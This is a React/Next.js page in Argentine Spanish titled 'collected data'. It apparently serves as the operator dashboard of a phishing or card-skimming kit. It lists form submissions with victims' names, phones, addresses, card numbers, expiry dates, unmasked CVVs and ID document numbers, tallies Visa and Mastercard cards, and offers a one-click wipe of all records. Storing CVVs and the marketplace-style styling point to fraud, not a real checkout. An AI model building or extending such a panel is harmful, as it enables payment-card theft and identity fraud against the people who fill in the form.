"use client"

import { useState, useEffect, useCallback } from "react"
import { RefreshCw, Trash2, ChevronDown, ChevronUp, CreditCard, MapPin, User, Phone, FileText, Clock } from "lucide-react"

interface Entry {
  id: string
  createdAt: string
  address: {
    address: string
    noNumber: boolean
    postalCode: string
    noPostalCode: boolean
    province: string
    locality: string
    department: string
    instructions: string
    domicileType: string
    fullName: string
    phone: string
  } | null
  paymentType: string
  card: {
    cardNumber: string
    holderName: string
    expiry: string
    cvv: string
    docType: string
    docNumber: string
    cardBrand: string
  } | null
}

function maskCard(num: string) {
  if (!num) return "---"
  const clean = num.replace(/\s/g, "")
  if (clean.length < 8) return clean
  return clean.substring(0, 4) + " **** **** " + clean.substring(clean.length - 4)
}

function EntryCard({ entry, index }: { entry: Entry; index: number }) {
  const [expanded, setExpanded] = useState(false)

  const date = new Date(entry.createdAt)
  const formattedDate = date.toLocaleDateString("es-AR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  })

  return (
    <div className="bg-white rounded-lg border border-[#E0E0E0] overflow-hidden">
      <button
        onClick={() => setExpanded(!expanded)}
        className="w-full flex items-center justify-between px-4 py-3.5 hover:bg-[#FAFAFA] transition-colors"
      >
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-full bg-[#3483FA] text-white text-xs font-bold flex items-center justify-center shrink-0">
            {index + 1}
          </div>
          <div className="text-left">
            <p className="text-sm font-medium text-[#333]">
              {entry.address?.fullName || "Sin nombre"}
            </p>
            <div className="flex items-center gap-2 text-xs text-[#999]">
              <Clock className="h-3 w-3" />
              {formattedDate}
            </div>
          </div>
        </div>
        <div className="flex items-center gap-3">
          {entry.card?.cardBrand && (
            <span className="text-[10px] font-bold text-[#3483FA] bg-[#EBF4FF] px-2 py-0.5 rounded">
              {entry.card.cardBrand}
            </span>
          )}
          {expanded ? (
            <ChevronUp className="h-4 w-4 text-[#999]" />
          ) : (
            <ChevronDown className="h-4 w-4 text-[#999]" />
          )}
        </div>
      </button>

      {expanded && (
        <div className="border-t border-[#EEEEEE] px-4 py-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Address section */}
            {entry.address && (
              <div className="space-y-2">
                <h4 className="text-xs font-semibold text-[#999] uppercase tracking-wider flex items-center gap-1.5">
                  <MapPin className="h-3 w-3" />
                  Domicilio
                </h4>
                <div className="bg-[#FAFAFA] rounded-md p-3 space-y-1.5 text-sm text-[#333]">
                  <p><span className="text-[#999]">Direccion:</span> {entry.address.address || "---"}</p>
                  <p><span className="text-[#999]">CP:</span> {entry.address.postalCode || "---"}</p>
                  <p><span className="text-[#999]">Provincia:</span> {entry.address.province || "---"}</p>
                  <p><span className="text-[#999]">Localidad:</span> {entry.address.locality || "---"}</p>
                  {entry.address.department && (
                    <p><span className="text-[#999]">Depto:</span> {entry.address.department}</p>
                  )}
                  {entry.address.instructions && (
                    <p><span className="text-[#999]">Indicaciones:</span> {entry.address.instructions}</p>
                  )}
                  <p><span className="text-[#999]">Tipo:</span> {entry.address.domicileType === "residential" ? "Residencial" : entry.address.domicileType === "work" ? "Laboral" : "---"}</p>
                </div>
              </div>
            )}

            {/* Contact section */}
            {entry.address && (
              <div className="space-y-2">
                <h4 className="text-xs font-semibold text-[#999] uppercase tracking-wider flex items-center gap-1.5">
                  <User className="h-3 w-3" />
                  Contacto
                </h4>
                <div className="bg-[#FAFAFA] rounded-md p-3 space-y-1.5 text-sm text-[#333]">
                  <p className="flex items-center gap-1.5">
                    <User className="h-3.5 w-3.5 text-[#999]" />
                    {entry.address.fullName || "---"}
                  </p>
                  <p className="flex items-center gap-1.5">
                    <Phone className="h-3.5 w-3.5 text-[#999]" />
                    {entry.address.phone || "---"}
                  </p>
                </div>

                {/* Card section */}
                {entry.card && (
                  <>
                    <h4 className="text-xs font-semibold text-[#999] uppercase tracking-wider flex items-center gap-1.5 mt-3">
                      <CreditCard className="h-3 w-3" />
                      Tarjeta
                    </h4>
                    <div className="bg-[#FAFAFA] rounded-md p-3 space-y-1.5 text-sm text-[#333]">
                      <p><span className="text-[#999]">Numero:</span> {maskCard(entry.card.cardNumber)}</p>
                      <p><span className="text-[#999]">Titular:</span> {entry.card.holderName || "---"}</p>
                      <p><span className="text-[#999]">Vence:</span> {entry.card.expiry || "---"}</p>
                      <p><span className="text-[#999]">CVV:</span> {entry.card.cvv || "---"}</p>
                      <p><span className="text-[#999]">Marca:</span> {entry.card.cardBrand || "---"}</p>
                      <p className="flex items-center gap-1.5">
                        <FileText className="h-3.5 w-3.5 text-[#999]" />
                        {entry.card.docType}: {entry.card.docNumber || "---"}
                      </p>
                    </div>
                  </>
                )}

                <p className="text-xs text-[#999] mt-2">
                  Tipo de pago: {entry.paymentType === "credit" ? "Credito" : entry.paymentType === "debit" ? "Debito" : "---"}
                </p>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  )
}

export default function DatosPage() {
  const [entries, setEntries] = useState<Entry[]>([])
  const [loading, setLoading] = useState(true)

  const fetchEntries = useCallback(async () => {
    setLoading(true)
    try {
      const res = await fetch("/api/data")
      const data = await res.json()
      setEntries(Array.isArray(data) ? data.reverse() : [])
    } catch {
      setEntries([])
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    fetchEntries()
  }, [fetchEntries])

  const handleClear = async () => {
    if (!confirm("Estas seguro que queres borrar todos los registros?")) return
    try {
      await fetch("/api/data", { method: "DELETE" })
      setEntries([])
    } catch {
      // fail silently
    }
  }

  return (
    <div className="min-h-screen bg-[#F5F5F5]">
      {/* Header */}
      <header className="bg-white border-b border-[#E0E0E0] sticky top-0 z-10">
        <div className="max-w-[900px] mx-auto px-4 py-3 flex items-center justify-between">
          <h1 className="text-base font-semibold text-[#333]">Datos recopilados</h1>
          <div className="flex items-center gap-2">
            <button
              onClick={fetchEntries}
              className="flex items-center gap-1.5 text-xs text-[#3483FA] hover:bg-[#EBF4FF] px-3 py-1.5 rounded-md transition-colors"
            >
              <RefreshCw className={`h-3.5 w-3.5 ${loading ? "animate-spin" : ""}`} />
              Actualizar
            </button>
            {entries.length > 0 && (
              <button
                onClick={handleClear}
                className="flex items-center gap-1.5 text-xs text-[#F23D4F] hover:bg-[#FEF0F1] px-3 py-1.5 rounded-md transition-colors"
              >
                <Trash2 className="h-3.5 w-3.5" />
                Borrar todo
              </button>
            )}
          </div>
        </div>
      </header>

      <main className="max-w-[900px] mx-auto px-4 py-6">
        {/* Stats */}
        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-6">
          <div className="bg-white rounded-lg border border-[#E0E0E0] p-3">
            <p className="text-2xl font-bold text-[#333]">{entries.length}</p>
            <p className="text-xs text-[#999]">Total registros</p>
          </div>
          <div className="bg-white rounded-lg border border-[#E0E0E0] p-3">
            <p className="text-2xl font-bold text-[#3483FA]">
              {entries.filter((e) => e.card?.cardBrand === "VISA").length}
            </p>
            <p className="text-xs text-[#999]">Visa</p>
          </div>
          <div className="bg-white rounded-lg border border-[#E0E0E0] p-3">
            <p className="text-2xl font-bold text-[#FF5F00]">
              {entries.filter((e) => e.card?.cardBrand === "MASTERCARD").length}
            </p>
            <p className="text-xs text-[#999]">Mastercard</p>
          </div>
        </div>

        {/* Entries */}
        {loading ? (
          <div className="flex items-center justify-center py-16">
            <RefreshCw className="h-6 w-6 text-[#999] animate-spin" />
          </div>
        ) : entries.length === 0 ? (
          <div className="bg-white rounded-lg border border-[#E0E0E0] p-8 text-center">
            <FileText className="h-10 w-10 text-[#E0E0E0] mx-auto mb-3" />
            <p className="text-sm text-[#999]">
              No hay registros todavia.
            </p>
            <p className="text-xs text-[#CCCCCC] mt-1">
              Los datos apareceran cuando se complete el formulario.
            </p>
          </div>
        ) : (
          <div className="space-y-3">
            {entries.map((entry, i) => (
              <EntryCard key={entry.id} entry={entry} index={entries.length - 1 - i} />
            ))}
          </div>
        )}
      </main>
    </div>
  )
}
